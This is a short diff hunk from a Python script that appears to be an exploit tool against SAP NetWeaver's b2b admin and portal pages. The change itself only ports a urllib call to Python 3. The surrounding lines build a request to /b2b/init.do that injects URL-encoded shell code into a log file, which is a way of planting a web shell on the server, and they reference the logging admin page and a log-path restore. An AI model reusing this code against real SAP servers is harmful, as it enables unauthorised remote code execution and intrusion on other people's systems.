@@ -69,7 +69,7 @@ def start(ip, port, username, password, sid, ssl):
     _irj_portal = "{0}://{1}/irj/portal".format(base_scheme,_server_ip_port)
     _b2b_admin_url = "{0}://{1}/b2b/admin/index.jsp".format(base_scheme,_server_ip_port)
     _url_of_log_path = "{0}://{1}/b2b/admin/logging.jsp".format(base_scheme,_server_ip_port)
-    _url_write_shell_to_log_file = "{0}://{1}/b2b/init.do?\"%22]{2}[%22\"".format(base_scheme,_server_ip_port,urllib.quote_plus(shell_code))
+    _url_write_shell_to_log_file = "{0}://{1}/b2b/init.do?\"%22]{2}[%22\"".format(base_scheme,_server_ip_port,urllib.parse.quote_plus(shell_code))
 
     # data variable
     _post_data_restore_log_path = {"selConfigName": "com.sap.isa",
